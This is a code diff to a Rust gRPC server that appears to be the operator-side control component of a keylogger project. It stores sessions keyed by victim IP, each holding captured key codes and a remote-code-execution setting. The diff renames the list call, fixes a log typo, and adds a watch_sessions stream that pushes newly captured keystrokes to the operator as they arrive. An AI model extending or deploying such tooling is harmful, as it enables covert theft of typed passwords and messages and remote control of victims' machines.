@@ -1,22 +1,23 @@
-use std::{collections::HashMap, net::Ipv4Addr, str::FromStr};
+use std::{collections::HashMap, net::Ipv4Addr, pin::Pin, str::FromStr};
 
 use log::{debug, info};
+use tokio_stream::Stream;
 use tonic::{transport::Server, Request, Response, Status};
 
 use crate::{
     tamanoir_grpc::{
         proxy_server::{Proxy, ProxyServer},
-        GetSessionsResponse, NoArgs, SessionResponse, SetSessionRceRequest,
+        ListSessionsResponse, NoArgs, SessionResponse, SetSessionRceRequest,
     },
     Session, SessionsStore, TargetArch,
 };
 
-pub async fn serve_tonic(grpc_port: u16, sessions: SessionsStore) -> anyhow::Result<()> {
+pub async fn serve_tonic(grpc_port: u16, sessions_store: SessionsStore) -> anyhow::Result<()> {
     let addr = format!("0.0.0.0:{}", grpc_port).parse().unwrap();
     info!("Starting grpc server");
-    debug!("Grpc server is listning on {}", addr);
+    debug!("Grpc server is listening on {}", addr);
     Server::builder()
-        .add_service(ProxyServer::new(sessions))
+        .add_service(ProxyServer::new(sessions_store))
         .serve(addr)
         .await?;
     Ok(())
@@ -24,16 +25,15 @@ pub async fn serve_tonic(grpc_port: u16, sessions: SessionsStore) -> anyhow::Res
 
 #[tonic::async_trait]
 impl Proxy for SessionsStore {
-    async fn get_sessions(
+    async fn list_sessions(
         &self,
         request: Request<NoArgs>,
-    ) -> Result<Response<GetSessionsResponse>, Status> {
+    ) -> Result<Response<ListSessionsResponse>, Status> {
         debug!(
             "<GetSessions> Got a request from {:?}",
             request.remote_addr()
         );
-        let current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
-            self.sessions.lock().await;
+        let current_sessions = self.sessions.lock().await;
 
         let mut sessions: Vec<SessionResponse> = vec![];
         for s in current_sessions.values().into_iter() {
@@ -43,7 +43,7 @@ impl Proxy for SessionsStore {
             })
         }
 
-        let reply = GetSessionsResponse { sessions };
+        let reply = ListSessionsResponse { sessions };
         Ok(Response::new(reply))
     }
 
@@ -79,5 +79,27 @@ impl Proxy for SessionsStore {
                 format!("{}: session not found", ip),
             )),
         }
+    }
+    type WatchSessionsStream =
+        Pin<Box<dyn Stream<Item = Result<SessionResponse, Status>> + Send + 'static>>;
+
+    async fn watch_sessions(
+        &self,
+        _request: Request<NoArgs>,
+    ) -> Result<Response<Self::WatchSessionsStream>, Status> {
+        let mut rx = self.tx.subscribe();
+
+        let stream = async_stream::try_stream! {
+        while let Ok(maybe_session) = rx.recv().await {
+            if let Some(session) = maybe_session {
+               yield SessionResponse {
+                    ip: session.ip.to_string(),
+                    key_codes: session.key_codes.iter().map(|byte| *byte as u32).collect(),
+                };
+
+            }
+        }
+        println!(" /// done sending");};
+        Ok(Response::new(Box::pin(stream) as Self::WatchSessionsStream))
     }
 }
